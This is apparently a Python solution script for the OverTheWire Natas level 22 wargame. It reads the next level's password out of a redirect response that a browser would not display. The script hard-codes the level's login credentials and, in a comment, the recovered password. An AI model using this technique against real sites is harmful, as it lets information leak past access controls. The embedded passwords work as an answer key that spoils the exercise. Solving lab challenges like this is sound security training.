import requests
import re

url = 'http://natas22.natas.labs.overthewire.org/?revelio'
auth = requests.auth.HTTPBasicAuth('natas22','chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')
r = requests.post(url, auth=auth)

pwd = re.findall('Password: (.*)</pre>', r.history[0].text)[0]
print(pwd) # D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

